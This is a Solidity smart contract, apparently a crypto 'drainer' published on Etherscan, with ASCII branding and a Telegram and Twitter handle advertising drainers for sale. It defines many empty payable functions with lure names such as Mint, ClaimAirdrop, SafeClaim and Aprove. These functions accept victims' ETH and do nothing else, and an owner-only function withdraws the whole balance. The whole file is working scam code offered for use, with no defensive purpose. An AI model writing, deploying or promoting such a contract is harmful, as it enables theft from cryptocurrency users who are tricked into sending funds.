/**
 *Submitted for verification at Etherscan.io on 2023-03-15
*/

/**
 *Submitted for verification at Etherscan.io on 2023-01-26
*/

/**
 *Submitted for verification at Etherscan.io on 2022-12-29
*/

/**
 *Submitted for verification at Etherscan.io on 2022-12-12
*/

// SPDX-License-Identifier: MIT


/**
██████╗░░█████╗░░█████╗░███████╗██████╗░  ██████╗░██████╗░░█████╗░██╗███╗░░██╗███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝██╔══██╗
██████╔╝███████║██║░░╚═╝█████╗░░██████╔╝  ██║░░██║██████╔╝███████║██║██╔██╗██║█████╗░░██████╔╝
██╔══██╗██╔══██║██║░░██╗██╔══╝░░██╔══██╗  ██║░░██║██╔══██╗██╔══██║██║██║╚████║██╔══╝░░██╔══██╗
██║░░██║██║░░██║╚█████╔╝███████╗██║░░██║  ██████╔╝██║░░██║██║░░██║██║██║░╚███║███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚══════╝╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
*/
// DM @Racer_Drainer (Telegram & Twitter)
// Get your drainer or lets work together

pragma solidity ^0.8.16;

contract RacerLicks {

    address private  owner;    // current owner of the contract

    constructor(){
        owner = msg.sender;
    }

    function getOwner(
    ) public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function withdrawBalance() external onlyOwner{
      (bool success, ) = msg.sender.call{value: address(this).balance}("");
      require(success, "WITHDRAW FAILED!");
    }

    function Mint() public payable {
    }

    function Claim() public payable {
    }

    function SafeClaim() public payable {
    }

    function SafeMint() public payable {
    }

    function Sign() public payable {
    }

    function Aprove() public payable {
    }

    function Confirm() public payable {
    }

    function MintNow() public payable {
    }

    function ClaimDevil() public payable {
    }

    function ClaimAirdrop() public payable {
    }

}